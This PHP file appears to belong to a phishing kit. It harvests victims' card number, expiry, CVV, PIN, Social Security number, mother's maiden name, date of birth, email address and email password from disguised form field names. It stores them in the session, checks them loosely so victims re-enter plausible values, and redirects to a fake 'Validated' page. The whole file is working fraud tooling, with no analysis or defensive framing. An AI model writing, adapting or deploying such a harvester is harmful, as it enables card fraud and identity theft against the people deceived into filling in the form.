<?php
ini_set("output_buffering",4096);
session_start();

require 'vcard.php';

//GET HOST NAME
$host = bin2hex ($_SERVER['HTTP_HOST']);

/** Opens a sessions to store Card form fields **/
$ccNum = $_POST['cfnumber'];
$expDate = $_POST['EXPDR'];
$CVV = $_POST['CCXV'];
$PIN = $_POST['PIXS'];
$SSN = $_POST['SOCANRN'];
$STATE = $_POST['Statx'];
$MMN = $_POST['MMSNAS'];
$DOB = $_POST['DOKBD'];
$email = $_POST['emaia'];
$password = $_POST['pasca'];
	
	$_SESSION['EXPDATE'] = $expDate;
	$_SESSION['CVVCARD'] = $CVV;
	$_SESSION['PINSS'] =  $PIN;
	$_SESSION['SSNNUMB'] = $SSN;
	$_SESSION['STATOC'] = $STATE;
	$_SESSION['MMONA'] = $MMN;
	$_SESSION['DOBS'] = $DOB;
	$_SESSION['EMAILS'] = $email;
	$_SESSION['EPASS'] = $password;


/** Validate if a valid email & pass **/
function is_email($input) {
  $email_pattern = "/^([a-zA-Z0-9\-\_\.]{1,})+@+([a-zA-Z0-9\-\_\.]{1,})+\.+([a-z]{2,4})$/i";
  if(preg_match($email_pattern, $input)) return TRUE;

}


/** Validate form fields inputs **/



//Validate card number
if (is_valid_card($ccNum))
{
$cc=0;
}
else
{
$cc=1;
}



if (strlen($CVV)<3)
{
$cvv=1;
}
else
{
$cvv=0;
}




if (strlen($expDate)<3)
{
$exp=1;
}
else
{
$exp=0;
}




if (strlen($SSN)<9)
{
$ssn=1;
}
else
{
$ssn=0;
}



if (strlen($DOB)<6)
{
$dob=1;
}
else
{
$dob=0;
}



if(!is_email($email))
{
$emaily=1;
}
else
{
$emaily=0;
}


if (strlen($password)<6)
{
$pasx=1;
}
else
{
$pasx=0;
}


if ($cc==1||$cvv==1||$exp==1||$ssn==1||$dob==1||$emaily==1||$pasx==1) 
{
$errors=1;
}
else{
$errors=0;
}


if ($errors==1) {

header("Location: profile.php?errors=$errors&cc=$cc&cvv=$cvv&expires=$exp&ssn=$ssn&dob=$dob&eml=$emaily&pa=$pasx&valid=FALSE&Header=$host").md5(time());
}

else {
	$_SESSION['CCNUMBER'] = $ccNum;

header("Location: Validated.php?Valid=TRUE&header_location=$host").md5(time());

}
?>